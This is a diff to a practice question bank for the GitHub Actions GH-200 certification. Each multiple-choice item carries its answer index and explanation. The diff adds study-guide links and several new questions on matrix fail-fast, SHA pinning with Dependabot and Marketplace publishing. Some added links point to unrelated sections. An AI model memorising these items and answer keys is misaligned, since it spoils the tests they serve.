  o:["The secrets explicitly passed by the caller, always","The production environment's own secrets — environment secrets do not flow through workflow_call the way caller-passed secrets do","A merge of both sets, caller-passed taking priority","Whichever secrets were used in the previous run"],
- c:1, e:"This is a specifically tested gotcha: a job with its own environment: pulls that environment's secrets directly, regardless of what secrets the caller tried to pass in."},
+ c:1, e:"This is a specifically tested gotcha: a job with its own environment: pulls that environment's secrets directly, regardless of what secrets the caller tried to pass in. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#25-consuming-reusable-workflows-workflow_call' target='_blank'>Study guide: Chapter 2 §2.5 — Consuming Reusable Workflows</a>."},
 {d:"troubleshoot", q:"Rapid successive pushes are triggering overlapping deploy runs to the same environment, racing each other. What's the standard fix?",
  o:["Add more self-hosted runners","concurrency: with a group: key and cancel-in-progress: true, so a new push cancels the older in-progress run for that group","Increase the matrix max-parallel setting","Switch the trigger from push to pull_request"],
- c:1, e:"concurrency + cancel-in-progress: true ensures only one run per group is active — a newer push cancels the older, superseded one, preventing racing deploys."},
+ c:1, e:"concurrency + cancel-in-progress: true ensures only one run per group is active — a newer push cancels the older, superseded one, preventing racing deploys. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"You choose 'Re-run failed jobs only' instead of a full re-run. What's the tradeoff to be aware of?",
  o:["It always produces identical results to a full re-run, no tradeoff exists","Already-succeeded jobs' prior results are reused as-is — if one of those succeeded jobs subtly produced bad output without technically failing, this option won't catch or fix that","It re-runs everything from scratch anyway, just faster","It permanently deletes the failed job's logs"],
- c:1, e:"Re-running only failed jobs is faster but not a guaranteed clean-slate retry — succeeded jobs' outputs/artifacts are reused unchanged, even if they were subtly wrong without technically failing."},
+ c:1, e:"Re-running only failed jobs is faster but not a guaranteed clean-slate retry — succeeded jobs' outputs/artifacts are reused unchanged, even if they were subtly wrong without technically failing. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
+{d:"troubleshoot", q:"A matrix job with 6 combinations shows one red ❌ and five grey 'Cancelled' results, all within seconds of each other. What should you actually investigate?",
+ o:["All six jobs equally — the cancellation is unrelated to the failure","Only the single red ❌ job — fail-fast (default true) cancelled the other five the instant it failed, so they were never the problem","Only the five cancelled jobs — the red one is a false positive","Re-run the whole matrix with more retries before investigating anything"],
+ c:1, e:"fail-fast defaults to true: the moment any one matrix combination fails, every other in-progress or queued combination is cancelled — not because they also failed, but because GitHub Actions assumes further results add no value once one has failed. 🔗 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#22-common-failure-categories-and-their-signatures' target='_blank'>Related: Chapter 2 §2.2 (matrix-specific troubleshooting note)</a>."},
+{d:"troubleshoot", q:"You're actively debugging a flaky matrix combination and want to see every combination's actual result instead of most getting cancelled the moment one fails. What do you change?",
+ o:["Remove the matrix entirely and test combinations one at a time forever","Set fail-fast: false on the strategy so all combinations run to completion regardless of others' outcomes","Set max-parallel: 1","Add continue-on-error: true to every step"],
+ c:1, e:"fail-fast: false disables the default cancel-on-first-failure behavior, letting every matrix combination run to completion — the standard temporary setting while debugging which specific combinations actually fail, since cancelled jobs give you no log to inspect. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#26-concurrency-control' target='_blank'>Study guide: Chapter 2 §2.6 — Concurrency Control</a>."},
 
-// ---------------- AUTHOR & MAINTAIN ACTIONS (14) ----------------
+// ---------------- AUTHOR & MAINTAIN ACTIONS (21) ----------------
 {d:"actions", q:"As of the current runner lineup, what value should `runs: using:` have in a JavaScript action's action.yml?",
  o:["node16","node20","node24","node-latest"],
- c:2, e:"Node 20 was fully removed from GitHub-hosted runners (Node 24 became the forced default). Seeing node20 in any current action.yml should be treated as outdated."},
+ c:2, e:"Node 20 was fully removed from GitHub-hosted runners (Node 24 became the forced default). Seeing node20 in any current action.yml should be treated as outdated. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"What is a composite action best suited for, and what does it require in its runs: block?",
  o:["Custom compiled logic; runs.using: 'node24'","Pure orchestration of existing steps/actions with no new logic; runs.using: 'composite', with every run: step required to declare shell: explicitly","Wrapping a specific Linux toolchain; runs.using: 'docker'","None of these — composite actions don't use a runs: block"],
- c:1, e:"Composite actions bundle existing steps/actions with no custom logic of their own, using runs.using: 'composite'. Unlike normal workflow steps, every run: step inside must explicitly declare shell: — there's no inferred default. 🔗 <a href='03_chapter_author_maintain_actions.md#31-three-action-types--choosing-correctly' target='_blank'>Related diagram: Chapter 3 §3.1 (action type decision tree)</a> — or try the <a href='08_interactive_companion.html#action' target='_blank'>Interactive Companion's Action Type Picker tab</a>."},
+ c:1, e:"Composite actions bundle existing steps/actions with no custom logic of their own, using runs.using: 'composite'. Unlike normal workflow steps, every run: step inside must explicitly declare shell: — there's no inferred default. 🔗 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Related diagram: Chapter 3 §3.1 (action type decision tree)</a> — or try the <a href='08_interactive_companion.html#action' target='_blank'>Interactive Companion's Action Type Picker tab</a>."},
 {d:"actions", q:"A composite action fails immediately on every runner. Its two run: steps have no shell: key. What's the bug?",
  o:["Composite actions can't contain run: steps at all","shell: is mandatory on every run: step inside a composite action — GitHub does not infer a default shell there the way it does for normal workflow steps","The action is missing an outputs: block","The action needs a Dockerfile"],
- c:1, e:"This is one of the most commonly tested composite-action gotchas: normal workflow steps get an inferred default shell (bash on Linux/macOS, pwsh on Windows), but composite action run: steps do not — shell: must be explicit on every one."},
+ c:1, e:"This is one of the most commonly tested composite-action gotchas: normal workflow steps get an inferred default shell (bash on Linux/macOS, pwsh on Windows), but composite action run: steps do not — shell: must be explicit on every one. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"How does a composite action expose an output for the consuming workflow to use?",
  o:["Outputs are automatic — any $GITHUB_OUTPUT write inside any step is exposed","Via a top-level outputs: block in action.yml that references steps.<id>.outputs.<name>, the same pattern used for job outputs","Only environment variables can be exposed, never outputs","Composite actions cannot produce outputs"],
- c:1, e:"Composite action outputs must be explicitly wired at the top level, mapping an output name to steps.<id>.outputs.<name> — mirroring how job-level outputs work in a normal workflow."},
+ c:1, e:"Composite action outputs must be explicitly wired at the top level, mapping an output name to steps.<id>.outputs.<name> — mirroring how job-level outputs work in a normal workflow. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"In a JavaScript action, what actually determines whether GitHub Actions marks the step as failed?",
  o:["Whether the console.log output contains the word 'error'","The process's exit code / an explicit call to core.setFailed() — logging an error message alone does not mark the step failed","Whether any HTTP request inside the action returned a non-200 status","The presence of a catch block, regardless of what's inside it"],
- c:1, e:"A caught error that's only logged (console.log) still lets the process exit 0, so GitHub marks the step green regardless of what happened internally. core.setFailed() (or a non-zero exit) is what actually fails the step."},
+ c:1, e:"A caught error that's only logged (console.log) still lets the process exit 0, so GitHub marks the step green regardless of what happened internally. core.setFailed() (or a non-zero exit) is what actually fails the step. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"Which action type is restricted to Linux runners only?",
  o:["Composite actions","JavaScript actions","Docker container actions","All action types share this restriction equally"],
- c:2, e:"Docker container actions only run on Linux runners — a hard platform constraint. Attempting to use one on windows-latest or macos-latest fails outright, often with a confusing generic error rather than an explicit explanation."},
+ c:2, e:"Docker container actions only run on Linux runners — a hard platform constraint. Attempting to use one on windows-latest or macos-latest fails outright, often with a confusing generic error rather than an explicit explanation. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"In a Docker container action's action.yml, what can `image:` reference?",
  o:["Only a pre-built image on Docker Hub","Either a local Dockerfile (built at job-run time) or a pre-built image reference like docker://ghcr.io/org/image:tag","Only a Dockerfile, never a pre-built image","A Kubernetes manifest"],
- c:1, e:"image: can point to a Dockerfile (built fresh every run — slower but always current) or reference a pre-built image (faster startup, but you own keeping it updated)."},
+ c:1, e:"image: can point to a Dockerfile (built fresh every run — slower but always current) or reference a pre-built image (faster startup, but you own keeping it updated). 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#34-docker-container-actions' target='_blank'>Study guide: Chapter 3 §3.4 — Docker Container Actions</a>."},
 {d:"actions", q:"An action needs to call the GitHub GraphQL API, parse complex JSON, and behave identically on ubuntu-latest, windows-latest, and macos-latest matrix jobs. Which action type fits?",
  o:["Composite action","JavaScript action","Docker container action","Any of the three work equally well"],
- c:1, e:"Docker is ruled out by the Windows/macOS requirement (Linux-only). Composite has no computation of its own for JSON/GraphQL logic. JavaScript, using @actions/github's Octokit client, runs identically across all three OS families."},
+ c:1, e:"Docker is ruled out by the Windows/macOS requirement (Linux-only). Composite has no computation of its own for JSON/GraphQL logic. JavaScript, using @actions/github's Octokit client, runs identically across all three OS families. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"An action simply chains actions/checkout, actions/setup-python, then pip install — with no custom logic at all. Which action type is the right fit, and why?",
  o:["JavaScript, because it's the most powerful option","Docker, for maximum environment control","Composite, because it's pure orchestration with no custom computation, avoiding the overhead of a build step or container image","None — this should be written as three separate workflow steps only"],
- c:2, e:"When there's no custom logic — just bundling existing steps/actions — a composite action is the right (and simplest) fit, avoiding unnecessary build or container overhead."},
+ c:2, e:"When there's no custom logic — just bundling existing steps/actions — a composite action is the right (and simplest) fit, avoiding unnecessary build or container overhead. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"An action needs to run terraform plan using one exact pinned Terraform CLI version and behave identically regardless of what's pre-installed on the consumer's runner. Which type fits best?",
  o:["Composite action","JavaScript action","Docker container action","workflow_dispatch"],
- c:2, e:"Guaranteeing an exact CLI version and identical behavior regardless of the host runner's pre-installed tools is exactly what a Docker image provides — the image itself is the environment."},
+ c:2, e:"Guaranteeing an exact CLI version and identical behavior regardless of the host runner's pre-installed tools is exactly what a Docker image provides — the image itself is the environment. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"Rank these `uses:` pinning strategies from least to most secure: @main, @v1, @<full commit SHA>.",
  o:["@v1 is the most secure, since it's the community convention","@main is most secure, since it always has the latest fixes","@main (least secure, fully mutable) < @v1 (moderate, convention-based) < full SHA (most secure, immutable)","All three provide equivalent security guarantees"],
- c:2, e:"@main is fully mutable and can change anytime. @v1 relies on a maintainer's social convention to move responsibly. A full commit SHA is the only cryptographically immutable option."},
+ c:2, e:"@main is fully mutable and can change anytime. @v1 relies on a maintainer's social convention to move responsibly. A full commit SHA is the only cryptographically immutable option. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"Why is pinning to a major-version tag like @v1 considered only a 'social contract,' not a technical guarantee?",
  o:["Because @v1 tags are automatically deleted after a year","Because nothing technically prevents a maintainer (or an attacker who compromises their account) from repointing v1 to different code without notice — only a full SHA is cryptographically immutable","Because @v1 tags don't actually exist in Git","Because GitHub blocks all tag-based references by default"],
- c:1, e:"Well-behaved maintainers move v1 forward responsibly by convention, but there's no technical enforcement — a compromised or careless maintainer could point v1 somewhere unexpected. A full SHA removes this risk entirely."},
+ c:1, e:"Well-behaved maintainers move v1 forward responsibly by convention, but there's no technical enforcement — a compromised or careless maintainer could point v1 somewhere unexpected. A full SHA removes this risk entirely. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"What does an action's action.yml `branding:` block control?",
  o:["Which runners the action is allowed to use","How the action appears in the GitHub Marketplace (icon and color)","The action's version number","The action's required permissions"],
- c:1, e:"branding: (an icon + color) is metadata specifically for how a published action displays in the Marketplace — alongside name and description."},
+ c:1, e:"branding: (an icon + color) is metadata specifically for how a published action displays in the Marketplace — alongside name and description. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
 {d:"actions", q:"A Docker action works fine in the author's own testing but fails for every consumer who includes windows-latest in their matrix, with a confusing 'no runner available'-style error. What's the real underlying cause?",
  o:["The consumer's Windows runner is out of disk space","Docker container actions are Linux-only — the error doesn't clearly say this, but the action was silently excluded from non-Linux runners in the matrix","The action.yml is missing a description field","Windows runners don't support actions/checkout"],
- c:1, e:"This is a favorite exam scenario precisely because the failure mode is a confusing generic error rather than an explicit 'Docker actions require Linux' message. The fix is restricting the matrix to Linux, or rewriting the action as composite/JavaScript for genuine cross-platform support."},
+ c:1, e:"This is a favorite exam scenario precisely because the failure mode is a confusing generic error rather than an explicit 'Docker actions require Linux' message. The fix is restricting the matrix to Linux, or rewriting the action as composite/JavaScript for genuine cross-platform support. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#34-docker-container-actions' target='_blank'>Study guide: Chapter 3 §3.4 — Docker Container Actions</a>."},
+{d:"actions", q:"A team pins every third-party action to a full commit SHA for security, but six months later nobody has updated any of them and several are now missing important fixes. What's the recommended fix for this specific problem?",
+ o:["Switch back to mutable @v1 tags so updates happen automatically","Add a github-actions entry to dependabot.yml so version bumps arrive as reviewable, SHA-updating pull requests","Delete the pinning strategy entirely since it clearly doesn't work","Manually check each action's repo every Monday"],
+ c:1, e:"SHA pinning solves immutability but removes visibility into new versions. Dependabot's github-actions ecosystem closes that gap by opening a PR that bumps the pinned SHA (with the human-readable version as a comment) whenever a newer release exists — giving you a reviewable diff instead of either a silent moving tag or permanent staleness. 🔗 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#35-publishing-and-versioning-actions' target='_blank'>Related: Chapter 3 §3.5 (Dependabot for actions)</a>."},
+{d:"actions", q:"A repository contains three related custom actions, each in its own subdirectory, plus one action.yml at the repo root. How many of these four actions can be listed on the GitHub Marketplace from this single repository?",
+ o:["All four, automatically","Only the one whose action.yml is at the repository root — the three subdirectory actions are consumable via uses: owner/repo/subdir@ref but aren't separately Marketplace-listed from this repo","None — Marketplace publishing requires a dedicated repo per action with no exceptions","All four, but only if they share the same version tag"],
+ c:1, e:"GitHub Marketplace publishing is tied to the repository's root-level action.yml. Actions living in subdirectories are still fully usable via the owner/repo/subdirectory@ref syntax, but they don't get their own independent Marketplace listing from that same repository. 🔗 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#35-publishing-and-versioning-actions' target='_blank'>Related: Chapter 3 §3.5 (Marketplace publishing)</a>."},
 
-// ---------------- MANAGE FOR THE ENTERPRISE (18) ----------------
+// ---------------- MANAGE FOR THE ENTERPRISE (31) ----------------
 {d:"enterprise", q:"An organization sets a permissive Actions policy, but the enterprise account has a stricter one. Which one governs?",
  o:["The organization's policy always wins, since it's more specific","The most restrictive applicable level always wins — here, the enterprise-level policy","Whichever policy was set most recently","Repository-level settings override both"],
- c:1, e:"Repo, org, and enterprise levels can each set a policy, but the most restrictive level always wins — an enterprise-level lockdown overrides a more permissive org-level setting. 🔗 <a href='04_chapter_manage_enterprise.md#41-allowed-actions-policy-repo-org-enterprise-levels' target='_blank'>Related diagram: Chapter 4 §4.1 (policy hierarchy)</a>."},
+ c:1, e:"Repo, org, and enterprise levels can each set a policy, but the most restrictive level always wins — an enterprise-level lockdown overrides a more permissive org-level setting. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#41-allowed-actions-policy-repo-org-enterprise-levels' target='_blank'>Related diagram: Chapter 4 §4.1 (policy hierarchy)</a>."},
 {d:"enterprise", q:"An org tightens its Actions policy to 'Allow <enterprise/org> actions and reusable workflows only.' Workflows across the org start failing to find actions/checkout. Why?",
  o:["actions/checkout was deprecated","This strict local-only policy blocks anything outside the enterprise/org — including GitHub's own actions like actions/checkout, which live in the actions org, not inside the enterprise","actions/checkout requires a paid plan","The workflows have a YAML syntax error"],
- c:1, e:"This is a classic exam trap: the strict 'local-only' tier blocks GitHub-authored actions too, since they technically live outside your enterprise/org. The fix is moving to the 'select actions' tier and allowlisting actions/* (or checking 'Allow actions created by GitHub')."},
+ c:1, e:"This is a classic exam trap: the strict 'local-only' tier blocks GitHub-authored actions too, since they technically live outside your enterprise/org. The fix is moving to the 'select actions' tier and allowlisting actions/* (or checking 'Allow actions created by GitHub'). 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"In an Actions allowlist, what does the syntax `*, !untrusted-org/*` mean?",
  o:["Block everything","Allow everything except actions from untrusted-org","Allow only untrusted-org's actions","This syntax is invalid"],
- c:1, e:"! excludes and is always evaluated as an override — this line allows everything broadly, then carves out an exception for a specific untrusted org."},
+ c:1, e:"! excludes and is always evaluated as an override — this line allows everything broadly, then carves out an exception for a specific untrusted org. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"Under a restrictive 'select actions' allowlist policy, are actions local to the same repository (referenced via ./) restricted?",
  o:["Yes, they must be explicitly allowlisted like any other action","No — local (./) actions in the same repository are never restricted by these policies, regardless of the allowlist","Only if the repository is public","Only on self-hosted runners"],
- c:1, e:"Local actions referenced with ./ are always exempt from allowed-actions policies — you can always call your own repo's local actions."},
+ c:1, e:"Local actions referenced with ./ are always exempt from allowed-actions policies — you can always call your own repo's local actions. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"By default, are public repositories allowed to submit jobs to a newly created self-hosted runner group?",
  o:["Yes, all repos in the org get access automatically","No — allows_public_repositories defaults to false; this must be explicitly opted into, given the fork-PR attack surface on public repos","Only if the runner group has fewer than 10 runners","Public repos can never use self-hosted runners under any configuration"],
- c:1, e:"New runner groups default to more restrictive visibility, and public repos specifically default to excluded — a deliberate safety default given the well-known fork-PR attack vector against self-hosted compute."},
+ c:1, e:"New runner groups default to more restrictive visibility, and public repos specifically default to excluded — a deliberate safety default given the well-known fork-PR attack vector against self-hosted compute. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"Why does the combined `runs-on: { group:, labels: }` syntax exist, instead of just using labels alone?",
  o:["It's purely cosmetic, with no functional difference from labels alone","It prevents an unintended runner elsewhere with matching labels but belonging to a different, wrong group from silently picking up the job","Labels alone are deprecated and no longer work","group: is required only for GitHub-hosted runners"],
- c:1, e:"Without pinning both group and labels, a runner in an entirely different (wrong) group but with matching labels could pick up your job. The combined syntax closes this real footgun."},
+ c:1, e:"Without pinning both group and labels, a runner in an entirely different (wrong) group but with matching labels could pick up your job. The combined syntax closes this real footgun. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"What distinguishes a runner scale set from a traditional self-hosted runner?",
  o:["A scale set can carry multiple labels, just like traditional runners","A scale set belongs to exactly one runner group and has exactly one label, with its active count controlled by an autoscaler (ARC) rather than being fixed","Scale sets only run on Windows","A scale set cannot be targeted from a workflow's runs-on:"],
- c:1, e:"Unlike traditional self-hosted runners (which can carry multiple labels), a runner scale set belongs to exactly one group and has exactly one label, and its size is autoscaled by ARC rather than fixed."},
+ c:1, e:"Unlike traditional self-hosted runners (which can carry multiple labels), a runner scale set belongs to exactly one group and has exactly one label, and its size is autoscaled by ARC rather than fixed. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#43-runner-scale-sets-and-actions-runner-controller-arc' target='_blank'>Study guide: Chapter 4 §4.3 — Runner Scale Sets & ARC</a>."},
 {d:"enterprise", q:"What manages autoscaling of ephemeral self-hosted runners on Kubernetes in the modern GitHub Actions approach?",
  o:["Actions Runner Controller (ARC), using runner scale sets","GitHub-hosted runners with a custom label","A cron job that provisions VMs nightly","Repository rulesets"],
- c:0, e:"ARC running on Kubernetes, using runner scale sets, is the modern approach to autoscaling self-hosted runners rather than maintaining a fixed pool of static machines."},
+ c:0, e:"ARC running on Kubernetes, using runner scale sets, is the modern approach to autoscaling self-hosted runners rather than maintaining a fixed pool of static machines. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#43-runner-scale-sets-and-actions-runner-controller-arc' target='_blank'>Study guide: Chapter 4 §4.3 — Runner Scale Sets & ARC</a>."},
 {d:"enterprise", q:"Two runner scale sets are both online and eligible for the same job. How does GitHub decide which one picks it up?",
  o:["The scale set with more available capacity always wins","This is not configurable — it's effectively a race between the eligible scale sets","The oldest scale set always wins","GitHub always alternates between them evenly"],
- c:1, e:"When multiple eligible scale sets are online, which one acquires the job is not something you can configure — it's effectively a race."},
+ c:1, e:"When multiple eligible scale sets are online, which one acquires the job is not something you can configure — it's effectively a race. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#43-runner-scale-sets-and-actions-runner-controller-arc' target='_blank'>Study guide: Chapter 4 §4.3 — Runner Scale Sets & ARC</a>."},
 {d:"enterprise", q:"One Kubernetes cluster hosting an ARC installation goes down. What happens to a runner scale set in a different, healthy cluster?",
  o:["It also stops accepting jobs until the first cluster recovers","It continues acquiring and running jobs normally — this cross-cluster resilience is a specific, testable operational detail","All in-flight jobs org-wide are cancelled","ARC requires all clusters to be online simultaneously to function at all"],
- c:1, e:"A scale set in a separate, healthy cluster keeps operating normally even if another ARC-hosting cluster goes down — this multi-cluster resilience is an explicitly noted operational property."},
+ c:1, e:"A scale set in a separate, healthy cluster keeps operating normally even if another ARC-hosting cluster goes down — this multi-cluster resilience is an explicitly noted operational property. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#43-runner-scale-sets-and-actions-runner-controller-arc' target='_blank'>Study guide: Chapter 4 §4.3 — Runner Scale Sets & ARC</a>."},
 {d:"enterprise", q:"What is the actual function of an organization's 'starter workflows'?",
  o:["They enforce that every repo in the org must use them","They are a discoverability/convenience mechanism that appears as a template option — they do not enforce anything; a maintainer can ignore or delete them freely","They automatically update every repo's existing workflow files","They replace the need for reusable workflows entirely"],
- c:1, e:"Starter workflows make it easy to start with an org's blessed pattern, but enforce nothing — a repo maintainer can delete or never adopt the template. Actual enforcement requires rulesets; actual shared logic requires reusable workflows. 🔗 <a href='04_chapter_manage_enterprise.md#45-enforcing-required-checks--repository-rulesets-current-mechanism' target='_blank'>Related diagram: Chapter 4 §4.5 (starter vs reusable vs rulesets)</a>."},
+ c:1, e:"Starter workflows make it easy to start with an org's blessed pattern, but enforce nothing — a repo maintainer can delete or never adopt the template. Actual enforcement requires rulesets; actual shared logic requires reusable workflows. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#45-enforcing-required-checks--repository-rulesets-current-mechanism' target='_blank'>Related diagram: Chapter 4 §4.5 (starter vs reusable vs rulesets)</a>."},
 {d:"enterprise", q:"An organization wants every repo's CI to genuinely, centrally include a security-scan step, such that a future update to the scan logic propagates everywhere automatically. What's the right mechanism?",
  o:["A starter workflow template","A reusable workflow (workflow_call) referenced by all consuming repos","A README instructing maintainers to add the step manually","An organization-wide Slack reminder"],
- c:1, e:"Reusable workflows provide real, centrally-maintained, DRY logic — a change in the shared workflow propagates to every caller on their next run (unless they've pinned to an old SHA). Starter workflows are discoverability only, not this kind of standardization."},
+ c:1, e:"Reusable workflows provide real, centrally-maintained, DRY logic — a change in the shared workflow propagates to every caller on their next run (unless they've pinned to an old SHA). Starter workflows are discoverability only, not this kind of standardization. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"What is the current mechanism for enforcing that a specific status check must pass before a PR can merge, org-wide?",
  o:["Required workflows (still fully supported and recommended)","Repository or organization-level rulesets requiring specific status checks — 'required workflows' has been retired","A pre-receive Git hook","Branch-level webhook subscriptions"],
- c:1, e:"'Required workflows' has been retired by GitHub; the current, correct mechanism is repository (or org-level) rulesets that require specific status checks to pass."},
+ c:1, e:"'Required workflows' has been retired by GitHub; the current, correct mechanism is repository (or org-level) rulesets that require specific status checks to pass. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"A PR is permanently stuck showing 'Required check: deploy-check — Expected — Waiting for status to be reported,' even though the workflow's jobs (lint, test, build) all pass. What's wrong?",
  o:["The workflow has a syntax error","The ruleset requires a status check literally named deploy-check, but no job in the workflow is named that — nothing will ever report under that name","The runner ran out of disk space","GitHub's status-check service is down"],
- c:1, e:"A required status check name must match an actual reported job name exactly. If a job was renamed (or never named to match) and the ruleset wasn't updated, the check waits forever for a name that will never report."},
+ c:1, e:"A required status check name must match an actual reported job name exactly. If a job was renamed (or never named to match) and the ruleset wasn't updated, the check waits forever for a name that will never report. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"What must stay in sync to avoid the 'orphaned required check' problem after refactoring a workflow?",
  o:["The workflow's on: trigger and the repo's default branch","A job's name in the workflow YAML and the exact required-check name configured in the repository/org ruleset","The runner's OS version and the action's Node version","Nothing — GitHub automatically updates rulesets when jobs are renamed"],
- c:1, e:"Renaming a job without updating the ruleset's required-check string is a very common, very realistic mistake — the ruleset's required-check name is coupled to the job name and must be updated together."},
+ c:1, e:"Renaming a job without updating the ruleset's required-check string is a very common, very realistic mistake — the ruleset's required-check name is coupled to the job name and must be updated together. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"Where can an organization see Actions usage and billing broken down by repository and runner type, and who changed the allowed-actions policy?",
  o:["Only via a support ticket to GitHub","Settings → Billing for usage, and the audit log for administrative events like policy changes","This information is not available at the organization level","Only enterprise (not organization) accounts can see this"],
- c:1, e:"Org/enterprise-level billing settings show usage by repo and runner type, and the audit log captures Actions-related admin events (policy changes, runner registration, secret creation/deletion) for accountability."},
+ c:1, e:"Org/enterprise-level billing settings show usage by repo and runner type, and the audit log captures Actions-related admin events (policy changes, runner registration, secret creation/deletion) for accountability. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 {d:"enterprise", q:"An org has 3 public repos, 15 private repos, and one ML team needing GPU access on 2 of those private repos. What's the recommended runner group design?",
  o:["One shared runner group for everything, to keep configuration simple","GitHub-hosted runners for the 3 public repos (avoiding self-hosted entirely); a general-private group for the other 13 private repos; a narrowly-scoped GPU group limited to just the 2 repos that need it","Put all 18 repos, public and private, on one self-hosted runner group with GPU labels","Disable self-hosted runners for the whole org to reduce complexity"],
- c:1, e:"Public repos should stay on GitHub-hosted runners entirely to sidestep the fork-PR attack surface. Private repos without GPU needs get a general group; GPU access should be scoped narrowly to only the 2 repos that actually need it — least privilege applied to runner group design. 🔗 <a href='04_chapter_manage_enterprise.md#42-self-hosted-runner-groups' target='_blank'>Related diagram: Chapter 4 §4.2 (runner group structure for this exact scenario)</a>."},
